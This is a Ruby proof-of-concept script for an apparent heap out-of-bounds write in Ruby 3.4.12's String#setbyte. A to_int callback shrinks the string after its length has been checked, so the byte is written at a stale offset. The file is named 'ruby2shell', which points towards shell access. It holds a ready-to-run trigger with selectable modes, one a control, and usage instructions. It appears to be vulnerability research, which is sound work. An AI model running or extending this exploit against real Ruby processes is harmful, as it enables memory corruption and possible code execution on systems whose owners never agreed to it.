# Adjacent Ruby 3.4.12 String#setbyte stale-length lane (same fix series as
# CVE-2026-132825).  The vulnerable build validates `pos` against RSTRING_LEN
# captured *before* `rb_to_int(value)`, which may run a Ruby `to_int` callback.
# The callback shrinks the receiver; the write then lands at the stale offset.
#
# `slice` keeps the heap buffer; the chosen byte at the stale offset is read
# with a read-only gdb breakpoint (see -gdb.cmd). `replace` shrinks through
# String#replace and `nochange` is the safe-input control; neither arm
# faulted ASan on this build. No stock readback is claimed. No marker,
# debugger write, ObjectSpace, maps read or wire input.  Usage:
#   ruby ruby2shell-setbyte-stale.rb slice 700 90

class Shrink
  def initialize(str, mode, value)
    @str = str
    @mode = mode
    @value = value
  end

  def to_int
    case @mode
    when :slice
      @str.slice!(1..-1)
    when :replace
      @str.replace("Z")
    when :nochange
      # control: the receiver is untouched
    else
      raise ArgumentError, "unknown mode #{@mode.inspect}"
    end
    @value
  end
end

mode = (ARGV[0] || "slice").to_sym
offset = Integer(ARGV[1] || 700)
value = Integer(ARGV[2] || 0x5a) & 0xff

s = ("A" * offset) + "ZQJ" + ("A" * 8)

begin
  s.setbyte(offset, Shrink.new(s, mode, value))
  puts "ok len=#{s.bytesize}"
rescue => e
  puts "raise #{e.class}: #{e.message}"
end
